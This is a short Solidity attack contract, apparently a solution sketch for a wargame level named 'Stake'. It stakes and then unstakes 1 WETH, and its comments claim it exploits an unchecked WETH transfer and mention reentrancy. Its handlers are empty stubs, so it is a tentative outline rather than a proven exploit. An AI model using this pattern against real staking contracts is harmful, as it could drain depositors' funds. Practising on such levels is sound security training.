pragma solidity ^0.8.0;
import "../levels/Stake.sol";
contract AttackContract {
    Stake public stake;

    constructor(address _stake) {
        stake = Stake(_stake);
    }

    function attackWETH() public {
        // Need to approve WETH before this
        stake.StakeWETH(1 ether);
        // Assume the attack exploits the unchecked WETH transfer
        stake.Unstake(1 ether);
    }

    fallback() external payable {
        // Reentrancy or receiving ETH
    }

    receive() external payable {
        // Handle received ETH
    }
}